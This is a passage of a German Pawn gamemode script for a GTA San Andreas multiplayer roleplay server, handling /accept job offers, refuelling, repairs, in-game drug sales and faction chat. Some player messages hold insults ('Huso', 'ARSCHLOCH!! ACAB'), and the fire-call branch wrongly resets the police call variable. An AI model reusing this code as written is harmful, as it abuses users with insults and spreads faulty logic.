	                SendClientMessage(playerid, COLOR_GREY, "   Keiner hat ein Taxi gerufen!");
			    	return 1;
	            }
			}
			else if(strcmp(x_job,"bus",true) == 0)
			{
			    if(TransportDuty[playerid] != 2)
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Busfahrer !");
				    return 1;
			    }
	            if(BusCallTime[playerid] > 0)
	            {
	                SendClientMessage(playerid, COLOR_GREY, "   Du hast bereits den Busanruf angenommen !");
				    return 1;
	            }
	            if(BusCall < 999)
	            {
	                if(IsPlayerConnected(BusCall))
	                {
	                    GetPlayerName(playerid, sendername, sizeof(sendername));
	                	GetPlayerName(BusCall, giveplayer, sizeof(giveplayer));
	                	format(string, sizeof(string), "* Du hast den Auftrag von %s angenommen, fahre zu dem Marker auf der MiniMap.",giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* Busfahrer %s ist unterwegs zu dir. Bitte warte an deiner momentanen Position.",sendername);
						SendClientMessage(BusCall, COLOR_LIGHTBLUE, string);
						new Float:X,Float:Y,Float:Z;
						GetPlayerPos(BusCall, X, Y, Z);
						SetPlayerCheckpoint(playerid, X, Y, Z, 5);
						GameTextForPlayer(playerid, "~w~Busfahrer~n~~r~Goto redmarker", 5000, 1);
						BusCallTime[playerid] = 1;
						BusAccepted[playerid] = BusCall;
						BusCall = 999;
						return 1;
					}
	            }
	            else
	            {
	                SendClientMessage(playerid, COLOR_GREY, "   Keiner hat einen Bus gerufen !");
			    	return 1;
	            }
			}
			else if(strcmp(x_job, "wheelman", true) == 0)
			{
			    if(!IsPlayerInFrac(playerid, 21))
			    {
			        SendClientMessage(playerid, COLOR_GREY, "Nur Wheelmen können Aufträge annehmen!");
			        return 1;
				}
				if(WCALL < 999)
				{
				    if(IsPlayerConnected(WCALL))
				    {
				        GetPlayerName(playerid, sendername,sizeof(sendername));
				        GetPlayerName(WCALL, giveplayer, sizeof(giveplayer));
				        format(string, sizeof(string), "* Du hast den Auftrag von %s angenommen. Fahre zur Roten Markierung.", giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /rmarker, um den Checkpoint zu löschen.");
            			format(string, sizeof(string), "* %s hat deinen Auftrag angenommen. Er ist unterwegs",sendername);
						SendClientMessage(WCALL, COLOR_LIGHTBLUE, string);
						new Float:X,Float:Y,Float:Z;
						GetPlayerPos(WCALL, X, Y, Z);
						SetPlayerCheckpoint(playerid, X, Y, Z, 5);
						WCALL = 999;
						return 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Spieler nichtmehr online!");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Keiner hat die Wheelmen gerufen!");
				}
			}















			else if(strcmp(x_job,"polizei",true) == 0)
			{
			    if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
			    {

		            if(CopCall < 999)
		            {
		                if(IsPlayerConnected(CopCall))
		                {
		                    GetPlayerName(playerid, sendername, sizeof(sendername));
		                	GetPlayerName(CopCall, giveplayer, sizeof(giveplayer));
		                	format(string, sizeof(string), "* Du hast den Notruf von %s angenommen, fahre zu der roten Markierung.",giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /rmarker um die Markierung zu löschen.");
	                        format(string, sizeof(string), "* Polizei Huso %s hat deinen Notruf angenommen. Warte an deiner momentanen Position.",sendername);
							SendClientMessage(CopCall, COLOR_LIGHTBLUE, string);
							new Float:X,Float:Y,Float:Z;
							GetPlayerPos(CopCall, X, Y, Z);
							SetPlayerCheckpoint(playerid, X, Y, Z, 5);
							GameTextForPlayer(playerid, "~w~Polizei~n~~r~Fahr zur Markierung", 5000, 1);
							CopCall = 999;
							return 1;
						}
		            }
		            else
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Niemand hat einen Polizisten gerufen!");
				    	return 1;
		            }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Polizist !");
				    return 1;
				}
			}



			else if(strcmp(x_job,"fire",true) == 0)
			{
			    if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
			    {

		            if(FireCall < 999)
		            {
		                if(IsPlayerConnected(FireCall))
		                {
		                    GetPlayerName(playerid, sendername, sizeof(sendername));
		                	GetPlayerName(FireCall, giveplayer, sizeof(giveplayer));
		                	format(string, sizeof(string), "* Du hast den Notruf von %s angenommen, fahre zu der roten Markierung.",giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /rmarker um die Markierung zu löschen.");
	                        format(string, sizeof(string), "* Feuerwehrmann %s hat deinen Notruf angenommen. Warte an deiner momentanen Position.",sendername);
							SendClientMessage(FireCall, COLOR_LIGHTBLUE, string);
							new Float:X,Float:Y,Float:Z;
							GetPlayerPos(FireCall, X, Y, Z);
							SetPlayerCheckpoint(playerid, X, Y, Z, 5);
							GameTextForPlayer(playerid, "~w~Feuerwehr~n~~r~Fahr zur Markierung", 5000, 1);
							CopCall = 999;
							return 1;
						}
		            }
		            else
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Niemand hat einen Feuerwehrmann gerufen!");
				    	return 1;
		            }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Polizei ARSCHLOCH!! ACAB !");
				    return 1;
				}
			}









			else if(strcmp(x_job,"medic",true) == 0)
			{
			    if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
			    {
		            if(MedicCallTime[playerid] > 0)
		            {
		                SendClientMessage(playerid, COLOR_GREY, "Du hast schon einen Notruf abgesetzt !");
					    return 1;
		            }
		            if(MedicCall < 999)
		            {
		                if(IsPlayerConnected(MedicCall))
		                {
		                    GetPlayerName(playerid, sendername, sizeof(sendername));
		                	GetPlayerName(MedicCall, giveplayer, sizeof(giveplayer));
		                	format(string, sizeof(string), "* Du hast den Notruf von %s angenommen, fahre zu der roten Markierung.",giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Benutze /rmarker um die Markierung zu löschen.");
	                        format(string, sizeof(string), "* Sanitäter %s hat deinen Notruf angenommen. Warte an deiner momentanen Position.",sendername);
							SendClientMessage(MedicCall, COLOR_LIGHTBLUE, string);
							new Float:X,Float:Y,Float:Z;
							GetPlayerPos(MedicCall, X, Y, Z);
							SetPlayerCheckpoint(playerid, X, Y, Z, 5);
							GameTextForPlayer(playerid, "~w~Sanitäter~n~~r~Fahr zur Markierung", 5000, 1);
							MedicCallTime[playerid] = 1;
							MedicCall = 999;
							return 1;
						}
		            }
		            else
		            {
		                SendClientMessage(playerid, COLOR_GREY, "   Niemand hat einen Sanitäter gerufen!");
				    	return 1;
		            }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Sanitäter !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"refill",true) == 0)
			{
			    if(RefillOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(RefillOffer[playerid]))
			        {
			            if(GetPlayerMoneySave(playerid) > RefillPrice[playerid])
			            {
			                GetPlayerName(RefillOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
			                new car = GetPlayerVehicleID(playerid);
			                new fuel;
			                PlayerInfo[RefillOffer[playerid]][pMechSkill] ++;
			                if(PlayerInfo[RefillOffer[playerid]][pMechSkill] == 50)
							{ SendClientMessage(RefillOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 2, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								else if(PlayerInfo[RefillOffer[playerid]][pMechSkill] == 100)
								{ SendClientMessage(RefillOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 3, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								else if(PlayerInfo[RefillOffer[playerid]][pMechSkill] == 200)
								{ SendClientMessage(RefillOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 4, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								else if(PlayerInfo[RefillOffer[playerid]][pMechSkill] == 400)
								{ SendClientMessage(RefillOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 5, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
							new level = PlayerInfo[RefillOffer[playerid]][pMechSkill];
							if(level >= 0 && level <= 50)
							{ fuel = 15; }
							else if(level >= 51 && level <= 100)
							{ fuel = 20; }
							else if(level >= 101 && level <= 200)
							{ fuel = 30; }
							else if(level >= 201 && level <= 400)
							{ fuel = 40; }
							else if(level >= 401)
							{ fuel = 50; }
			                format(string, sizeof(string), "* Du hast das Auto von %d mit %d Benzin für $%d auftanken lassen.",giveplayer,fuel,RefillPrice[playerid]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Du hast %s's Fahrzeug mit %d Benzin aufgefüllt. Die $%d wurden zum Zahltag gerechnet.",sendername,fuel,RefillPrice[playerid]);
							SendClientMessage(RefillOffer[playerid], COLOR_LIGHTBLUE, string);
							PlayerInfo[RefillOffer[playerid]][pPayCheck] += RefillPrice[playerid];
							GivePlayerMoneySave(playerid, -RefillPrice[playerid]);
							new maxgas = GetGasMax(GetVehicleModel(car));
						 	new fahrzeug = GetPlayerVehicleID(playerid);
						    if(IsADtCar(fahrzeug))
						    {
								 new carowner = GetDtCarOwner(fahrzeug);
								 new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
							     PlayerCar[carowner][slot][Benzin] += maxgas;
						 	}
						    else for(new fc;fc<sizeof(FactionCars);fc++)
							{
							    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
								{
							        if(fahrzeug == FactionCars[fc][fCarid])
									{
					                     FactionCars[fc][fTuning][16] += maxgas;// Benzin
							  		}
								}
							}
					        RefillOffer[playerid] = 999;
							RefillPrice[playerid] = 0;
							return 1;
			            }
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Du kannst nicht Auffüllen !");
						    return 1;
						}
			        }
			        return 1;
			    }
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen gesagt das er dich betanken soll !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"live",true) == 0)
			{
			    if(LiveOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(LiveOffer[playerid]))
			        {
				        if (ProxDetectorS(5.0, playerid, LiveOffer[playerid]))
						{
						    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du bist bis zum Ende Gefreezt.");
							SendClientMessage(LiveOffer[playerid], COLOR_LIGHTBLUE, "* Du bist gefreezt (tipp /live um zu Beenden).");
							FreezePlayer(playerid);
							FreezePlayer(LiveOffer[playerid]);
							TalkingLive[playerid] = LiveOffer[playerid];
							TalkingLive[LiveOffer[playerid]] = playerid;
							LiveOffer[playerid] = 999;
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Kein News Reporter in deiner nähe !");
							return 1;
						}
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Keiner gibt dir eine Live Unterhaltung !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"anwalt",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /accept anwalt [playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsACop(playerid) || gTeam[playerid] == 2)
				{
				    if(IsPlayerConnected(giveplayerid))
				    {
				        if(giveplayerid != INVALID_PLAYER_ID)
				        {
				            if(PlayerInfo[giveplayerid][pJob] == 2)
				            {
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* Du hast %s erlaubt einen Gefangenen zu befreien.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE,string);
								format(string, sizeof(string), "* Officer %s hat dir erlaubt den Gefangenen zu befreien.(/free)", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE,string);
								ApprovedLawyer[giveplayerid] = 1;
							    return 1;
							}
						}
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, " Du bist kein Polizist / Soldat / FBI Agent!");
				    return 1;
				}
			}
			else if(strcmp(x_job,"bodyguard",true) == 0)
			{
			    if(GuardOffer[playerid] < 999)
			    {
			        if(GetPlayerMoneySave(playerid) > GuardPrice[playerid])
				    {
					    if(IsPlayerConnected(GuardOffer[playerid]))
					    {
					        GetPlayerName(GuardOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du hast den Schutz für $%d von Bodyguard %s angenommen.",GuardPrice[playerid],giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s will deinen Schutz, die $%d wurden zum Zahltag addiert.",sendername,GuardPrice[playerid]);
							SendClientMessage(GuardOffer[playerid], COLOR_LIGHTBLUE, string);
							PlayerInfo[GuardOffer[playerid]][pPayCheck] += GuardPrice[playerid];
							GivePlayerMoneySave(playerid, -GuardPrice[playerid]);
					        GuardOffer[playerid] = 999;
							GuardPrice[playerid] = 0;
							return 1;
						}
						return 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Fehler !");
					    return 1;
					}
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Keiner will dich beschützen !");
			        return 1;
			    }
			}
			else if(strcmp(x_job,"drugs",true) == 0)
			{
			    if(DrugOffer[playerid] < 999)
			    {
			        if(GetPlayerMoneySave(playerid) > DrugPrice[playerid])
				    {
				        if(PlayerInfo[playerid][pDrugs] < 7)
				        {
					        if(IsPlayerConnected(DrugOffer[playerid]))
					        {
					            GetPlayerName(DrugOffer[playerid], giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* Du hast %d Gramm für $%d vom Drogen Händler %s gekauft.",DrugGram[playerid],DrugPrice[playerid],giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat deine %d Gramm gekauft, er zahlt $%d .",sendername,DrugGram[playerid],DrugPrice[playerid]);
								SendClientMessage(DrugOffer[playerid], COLOR_LIGHTBLUE, string);
								ProxDetector(7.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								//PlayerInfo[DrugOffer[playerid]][pPayCheck] += DrugPrice[playerid];
								PlayerInfo[DrugOffer[playerid]][pDrugsSkill] ++;
								GivePlayerMoneySave(playerid, -DrugPrice[playerid]);
								GivePlayerMoneySave(DrugOffer[playerid],DrugPrice[playerid]);
								PlayerInfo[playerid][pDrugs] += DrugGram[playerid];
								PlayerInfo[DrugOffer[playerid]][pDrugs] -= DrugGram[playerid];
								if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 50)
								{ SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Dein Skill Level ist nun LVL 2 du kannst nun mehr Gramm für mehr Geld verkaufen."); }
								else if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 100)
								{ SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Dein Skill Level ist nun LVL 3 du kannst nun mehr Gramm für mehr Geld verkaufen."); }
								else if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 200)
								{ SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Dein Skill Level ist nun LVL 4 du kannst nun mehr Gramm für mehr Geld verkaufen."); }
								else if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 400)
								{ SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Dein Skill Level ist nun LVL 5 du kannst nun mehr Gramm für mehr Geld verkaufen."); }
					            DrugOffer[playerid] = 999;
								DrugPrice[playerid] = 0;
								DrugGram[playerid] = 0;
								return 1;
							}
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Du kannst keine Drogen mehr aufnehmen !");
						    return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Du kannst so viele nicht Anbieten!");
					    return 1;
					}
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Keiner möchte deine Drogen !");
			        return 1;
			    }
			}
			else if(strcmp(x_job,"repair",true) == 0)
			{
			    if(RepairOffer[playerid] < 999)
			    {
			        if(GetPlayerMoneySave(playerid) > RepairPrice[playerid])
				    {
					    if(IsPlayerInAnyVehicle(playerid))
					    {
					        if(IsPlayerConnected(RepairOffer[playerid]))
					        {
						        GetPlayerName(RepairOffer[playerid], giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        RepairCar[playerid] = GetPlayerVehicleID(playerid);
						        SetVehicleHealth(RepairCar[playerid], 1000.0);
								format(string, sizeof(string), "* Du hast dein Auto für $%d von Mechaniker %s reparieren lassen.",RepairPrice[playerid],giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s's Auto repariert.  Die $%d wurden zum Zahltag gerechnet ",sendername,RepairPrice[playerid]);
								SendClientMessage(RepairOffer[playerid], COLOR_LIGHTBLUE, string);
								PlayerInfo[RepairOffer[playerid]][pMechSkill] ++;
				                if(PlayerInfo[RepairOffer[playerid]][pMechSkill] == 50)
								{ SendClientMessage(RepairOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 2, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								else if(PlayerInfo[RepairOffer[playerid]][pMechSkill] == 100)
								{ SendClientMessage(RepairOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 3, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								else if(PlayerInfo[RepairOffer[playerid]][pMechSkill] == 200)
								{ SendClientMessage(RepairOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 4, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								else if(PlayerInfo[RepairOffer[playerid]][pMechSkill] == 400)
								{ SendClientMessage(RepairOffer[playerid], COLOR_YELLOW, "* Du hast jetzt Mechaniker Skill Level 5, Du kannst nun mehr Benzin in die Autos der Kunden füllen."); }
								PlayerInfo[RepairOffer[playerid]][pPayCheck] += RepairPrice[playerid];
								GivePlayerMoneySave(playerid, -RepairPrice[playerid]);
								RepairVehicle(GetPlayerVehicleID(playerid));//NEU
						        RepairOffer[playerid] = 999;
								RepairPrice[playerid] = 0;
								return 1;
							}
							return 1;
						}
						return 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Du kannst dir diese Reparatur nicht leisten !");
					    return 1;
					}
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Keiner hat dir eine Reparatur angeboten !");
			        return 1;
			    }
			}
			else { return 1; }
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/refill", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(PlayerInfo[playerid][sMember] ==24)
		    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /refill [playerid] [preis]");
				return 1;
			}
			new playa;
			new money;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			money = strval(tmp);
			if(money < 1 || money > 450) { SendClientMessage(playerid, COLOR_GREY, "   Der Preis darf nicht unter 1$ oder über 450$ liegen!"); return 1; }
			if(IsPlayerConnected(playa))
			{
			    if(playa != INVALID_PLAYER_ID)
			    {
			        if(ProxDetectorS(8.0, playerid, playa)&& IsPlayerInAnyVehicle(playa))
					{
					    if(playa == playerid) { SendClientMessage(playerid, COLOR_GREY, "   Du kannst dein eigenes Auto nicht auftanken!"); return 1; }
					    GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "* Du hast %s das Betanken seines Auto für $%d angeboten .",giveplayer,money);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* KFZ-Mechaniker %s bietet dir die Betankung deines Autos für $%d an, (gib /accept refill) ein um anzunehmen.",sendername,money);
						SendClientMessage(playa, COLOR_LIGHTBLUE, string);
						RefillOffer[playa] = playerid;
						RefillPrice[playa] = money;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe / nicht in seinem Auto.");
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline.");
			}
		}
		}
		return 1;
	}
 if(strcmp(cmd, "/repair", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
            if(PlayerInfo[playerid][sMember] == 24)
		    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /repair [playerid] [Preis]");
				return 1;
			}
			new playa;
			new money;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			money = strval(tmp);
			if(money < 1 || money > 450) { SendClientMessage(playerid, COLOR_GREY, "   Der Preis darf nicht unter 1$ oder über 450$ liegen!"); return 1; }
			{
				if(IsPlayerConnected(playa))
				{
				    if(playa != INVALID_PLAYER_ID)
				    {
				        if(ProxDetectorS(8.0, playerid, playa)&& IsPlayerInAnyVehicle(playa))
						{
						    if(playa == playerid) { SendClientMessage(playerid, COLOR_GREY, "   Du kannst dein eigenes Auto nicht Reparieren!"); return 1; }
					    	GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
						    format(string, sizeof(string), "* Du hast %s die Reparatur seines Wagens für $%d angeboten .",giveplayer,money);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* KFZ-Mechaniker %s bietet dir eine Reparatur deines Wagens für $%d an, (gib /accept repair) ein um anzunehmen.",sendername,money);
							SendClientMessage(playa, COLOR_LIGHTBLUE, string);
							RepairOffer[playa] = playerid;
							RepairPrice[playa] = money;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe / nicht in seinem Wagen.");
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline.");
				}
			}
		  }
		}
		return 1;
	}
	if(strcmp(cmd, "/callcar", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(CarCalls[playerid] > 0)
		    {
		        new Float:plocx,Float:plocy,Float:plocz;
	            GetPlayerPos(playerid, plocx, plocy, plocz);
				SetVehiclePos(CarID[playerid],plocx,plocy+4, plocz);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bestelltes Auto ist angekommen.");
				CarCalls[playerid] -= 1;
				format(string, sizeof(string), "* Du kannst dein bestelltes Auto %d mal rufen.", CarCalls[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		    }
		    else
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Fehler!");
		    }
		}
	    return 1;
	}
   if(strcmp(cmd, "/family", true) == 0 || strcmp(cmd, "/f", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[90];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: (/f)amily [chat]");
                return 1;
            }
            if(PlayerInfo[playerid][sMember] >= 5)
            {
                new member = PlayerInfo[playerid][sMember];
                if(member==5)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
				}
    			else if(member==6)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==8)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==9)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==10)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==11)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==12)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==13)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==14)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==15)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==16)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==17)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==18)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==19)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==20)
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==21) // Wheelman
                {
                    format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                else if(member==23) // Russen
                {
                   format(string, sizeof(string), "** %s %s: %s. )) **",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), sendername, result);
					 SendFamilyMessage(PlayerInfo[playerid][sMember], TEAM_AZTECAS_COLOR, string);
                }
                printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid,0xC8C8C8FF, "Du bist kein Kein Familienmitglied!");
                return 1;
            }
        }//not connected
        return 1;
    }
	if(strcmp(cmd, "/news", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
			{
		        if(PlayerInfo[playerid][pMuted] == 1)
				{
					SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du bist gemutet!");
					return 1;
				}
				if (GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 586)
				{
